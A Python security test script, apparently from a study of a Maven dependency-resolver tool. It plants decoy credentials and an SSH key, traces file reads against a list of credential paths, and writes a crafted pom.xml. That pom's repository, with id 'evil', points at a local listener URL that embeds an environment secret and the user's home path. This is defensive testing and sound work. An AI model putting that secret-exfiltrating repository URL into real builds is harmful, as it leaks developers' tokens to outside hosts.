import os,subprocess,sys,time,threading,http.server,shutil,json
S=sys.argv[1]; JH=os.environ['JAVA_HOME']
CP=open(S+'/harness/cp.txt').read().strip()
ENV={'HOME':S+'/home','PATH':'/usr/bin:/bin','JAVA_HOME':JH,'SECRET_TOKEN':'DECOY-ENV-TOKEN'}
os.makedirs(S+'/home/.m2',exist_ok=True); os.makedirs(S+'/home/.ssh',exist_ok=True)
open(S+'/home/.m2/settings.xml','w').write('<settings><servers><server><id>central</id><username>decoy</username><password>DECOY-PASSWORD</password></server></servers><mirrors><mirror><id>m</id><mirrorOf>*</mirrorOf><url>http://127.0.0.1:18998/mirror</url></mirror></mirrors></settings>')
open(S+'/home/.ssh/id_decoy','w').write('DECOY-SSH-KEY')
out={}
# --- 1. file-access trace for harness and for Maven baseline
def trace(name,cmd):
    tf=f'{S}/out/{name}.trace.sb'
    if os.path.exists(tf): os.remove(tf)
    prof=f'(version 1)(allow default)(deny network*)(trace "{tf}")'
    r=subprocess.run(['sandbox-exec','-p',prof]+cmd,env=ENV,capture_output=True,text=True,cwd=S+'/projects/s2-bom',timeout=180)
    txt=open(tf).read() if os.path.exists(tf) else ''
    return r.returncode,txt
rc,t=trace('harness',[JH+'/bin/java','-cp',S+'/harness/classes:'+CP,'MetaResolve','--pom',S+'/projects/s2-bom/pom.xml','--repo',S+'/repo-study','--out',S+'/out/trace-h.txt'])
out['harness_rc']=rc
rc2,t2=trace('baseline',['/opt/homebrew/bin/mvn','-B','-o','-s',S+'/empty-settings.xml','-gs',S+'/empty-settings.xml','-Dmaven.repo.local='+S+'/repo-study','org.apache.maven.plugins:maven-dependency-plugin:3.8.1:tree','-DoutputFile='+S+'/out/trace-b.txt'])
out['baseline_rc']=rc2
def sens(txt):
    paths=set(l.split('"')[1] for l in txt.splitlines() if l.startswith('(allow file-read') and '"' in l)
    keys=['/home/.m2','settings.xml','/home/.ssh','id_decoy','/.m2/','.mavenrc','/.config','/.netrc','<home>/.']
    return {k:sorted(p for p in paths if k in p)[:6] for k in keys}
out['harness_sensitive']=sens(t); out['baseline_sensitive']=sens(t2)
out['harness_unique_read_paths']=len(set(l for l in t.splitlines() if l.startswith('(allow file-read')))
# --- 2. declared-repository exfiltration/SSRF: local listening server
hits=[]
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self): hits.append(self.path); self.send_response(404); self.end_headers()
    do_HEAD=do_GET
    def log_message(self,*a): pass
srv=http.server.HTTPServer(('127.0.0.1',18999),H); threading.Thread(target=srv.serve_forever,daemon=True).start()
d=S+'/projects/s15b-declared-repo-exfil'; os.makedirs(d,exist_ok=True)
open(d+'/pom.xml','w').write('<project xmlns="http://maven.apache.org/POM/4.0.0"><modelVersion>4.0.0</modelVersion><groupId>org.synth</groupId><artifactId>s15b</artifactId><version>1.0</version><repositories><repository><id>evil</id><url>http://127.0.0.1:18999/x/${env.SECRET_TOKEN}/${user.home}</url></repository></repositories><dependencies><dependency><groupId>org.synth</groupId><artifactId>not-in-cache</artifactId><version>1.0</version></dependency></dependencies></project>')
# harness (no sandbox so that it COULD reach the listener if it tried)
r=subprocess.run([JH+'/bin/java','-cp',S+'/harness/classes:'+CP,'MetaResolve','--pom',d+'/pom.xml','--repo',S+'/repo-study','--out',S+'/out/s15b.h.txt'],env=ENV,capture_output=True,text=True,cwd=S,timeout=120)
out['harness_requests_to_declared_repo']=list(hits); hits.clear()
# baseline Maven ONLINE, unsandboxed, trusted synthetic project: shows what real Maven would do
r=subprocess.run(['/opt/homebrew/bin/mvn','-B','-s',S+'/empty-settings.xml','-gs',S+'/empty-settings.xml','-Dmaven.repo.local='+S+'/repo-study-scratch','org.apache.maven.plugins:maven-dependency-plugin:3.8.1:tree','-DoutputFile='+S+'/out/s15b.b.txt'],env=ENV,capture_output=True,text=True,cwd=d,timeout=180)
out['baseline_requests_to_declared_repo']=list(dict.fromkeys(hits))[:6]
# --- 3. network negative control
r=subprocess.run(['sandbox-exec','-p','(version 1)(allow default)(deny network*)','/usr/bin/curl','-sS','-m','5','https://repo.maven.apache.org/maven2/'],capture_output=True,text=True)
out['sandbox_network_negative_control']=(r.returncode,(r.stderr or r.stdout)[:120])
open(S+'/out/study/sec1.json','w').write(json.dumps(out,indent=1)); print(json.dumps(out,indent=1))
